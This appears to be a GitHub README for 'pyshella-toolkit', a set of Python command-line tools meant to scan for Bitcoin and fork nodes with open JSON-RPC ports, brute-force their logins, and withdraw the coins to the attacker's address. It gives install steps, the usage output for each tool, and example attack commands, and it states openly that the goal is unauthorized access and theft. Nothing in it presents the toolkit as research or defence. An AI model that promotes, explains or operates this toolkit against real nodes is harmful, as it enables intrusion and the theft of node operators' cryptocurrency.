# pyshella-toolkit

[![Python 3.7](https://img.shields.io/badge/python-3.7-blue.svg)](https://www.python.org/downloads/release/python-370/)
![Platform](https://img.shields.io/badge/platform-linux-green.svg)
[![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/Naereen/StrapDown.js/blob/master/LICENSE)

This is simple toolkit for Bitcoin or Bitcoin forks , which contains
cli scripts such as `peers-scanner`, `jsonrpc-searcher`, 
`jsonrpc-bruter`, `coins-withdrawal`. 

This set of scripts allows you to find peers with the JSON-RPC
port open to the outside, followed by a bruteforce attack
and withdrawal the coins.


## **Getting started**
* [Installation](#installation)
* [Peers Scanner](#peers-scanner)
* [JSON-RPC Searcher](#json-rpc-searcher)
* [JSON-RPC Bruter](#json-rpc-bruter)
* [Coins Withdrawal](#coins-withdrawal)



## Installation
```bash
git clone https://github.com/mkbeh/pyshella-toolkit
cd pyshella-toolkit/
pip3.7 install wheel
python3.7 setup.py install --user

# NOTE: if error - try previously 
pip3.7 install wheel
export PYTHONPATH=~/.local/lib/python3.7/site-packages
```


## Peers Scanner
The `peers scanner` scans the network for available peers and 
writes them to a file. For new peers, old ones are blacklisted.

### How to use
```
usage: pyshella-peers-scanner [-h] -nU  [-b] [-i] -mU   -n

optional arguments:
  -h, --help            show this help message and exit
  -nU , --node-uri      Node URI.
  -b , --ban-time       The time(days) which will be banned each peer (by
                        default 14 days).
  -i , --interval       Interval(secs) between call cycles for new peers (by
                        default 60 secs).
  -mU  , --mongo-uri    MongoDB uri.
  -n  , --coin-name     Name of cryptocurrency.

-----------------------------------------------------------------------------
Usage example: pyshella-peers-scanner -nU <node_uri> -mU <mongo_uri> -n <coin_name>
```

## JSON-RPC Searcher
Scanner which discovers Bitcoin/forks JSON-RPC on peers.

### How to use
```
usage: pyshella-jsonrpc-searcher [-h] -n NAME [-mU URI] [-cT SECS] [-rT SECS]
                                 [-bT SECS] [-hS NUM] [-pS NUM] [-v BOOL]

optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --coin-name NAME
                        Name of cryptocurrency.
  -mU URI, --mongo-uri URI
                        MongoDB URI. Default:
                        mongodb://root:toor@localhost:27017
  -cT SECS              Timeout between hosts block cycles.
  -rT SECS              Time to wait for a response from the server after
                        sending the request.
  -bT SECS              Delay between block cycles.
  -hS NUM               The number of hosts that will be processed
                        simultaneously.
  -pS NUM               The number of ports that will be processed
                        simultaneously for each host.
  -v BOOL               Activate verbose mode. Will show all found headers.

-----------------------------------------------------
Usage example: pyshella-jsonrpc-searcher -n Bitcoin -bT 1 -hS 1 -pS 200 -v True
```


## JSON-RPC Bruter
Bitcoin/fork JSON-RPC bruter. Based on asyncio.

### How to use
```
usage: pyshella-jsonrpc-bruter [-h] -n NAME [-mU URI] -l SINGLE/FILE -p
                               SINGLE/FILE [-b ORDER] [-t NUM] [-rT SECS]
                               [-cT SECS]
optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --coin-name NAME
                        Name of cryptocurrency.
  -mU URI, --mongo-uri URI
                        MongoDB URI. Default:
                        mongodb://root:toor@localhost:27017
  -l SINGLE/FILE, --logins SINGLE/FILE
                        Single login or file with logins.
  -p SINGLE/FILE, --passwords SINGLE/FILE
                        Single password or file with passwords.
  -b ORDER, --brute-order ORDER
                        The order in which the brute force process will occur.
                        Where H - hosts, L - logins, P - passwords. Default:
                        HLP. Examples: HLP, LPH, PHL, etc.
  -t NUM, --threads NUM
                        The number of coroutines that will be asynchronous in
                        bruteforce process.
  -rT SECS, --read-timeout SECS
                        Time to wait for a response from the server after
                        sending the request.
  -cT SECS, --cycle-timeout SECS
                        Timeout between getting new data for brute.

----------------------------------------------------------------------------------------------
Usage example:
-> pyshella-jsonrpc-bruter --help
-> pyshella-jsonrpc-bruter -n Bitcoin -t 20 -l <logins_file> -p <pwds_file> -b HLP
```


## Coins Withdrawal
Utility which withdrawal crypto currency from bruted JSON-RPC.

### How to use
```
usage: pyshella-coins-withdrawal [-h] -n NAME -mU URI -a ADDR [-i SECS]

optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --coin-name NAME
                        Name of cryptocurrency.
  -mU URI, --mongo-uri URI
                        MongoDB uri.
  -a ADDR, --withdrawal-address ADDR
                        The address to which the coins will be sent.
  -i SECS, --interval SECS
                        Timeout after coins withdrawal from all the peers that
                        were collected in the database at the moment.

-----------------------------------------------------------------------------------------------------------------------
Usage example: pyshella-coins-withdrawal -n Bitcoin -mU mongodb://root:toor@localhost:27017 -a <withdrawal_addr> -i 300
```
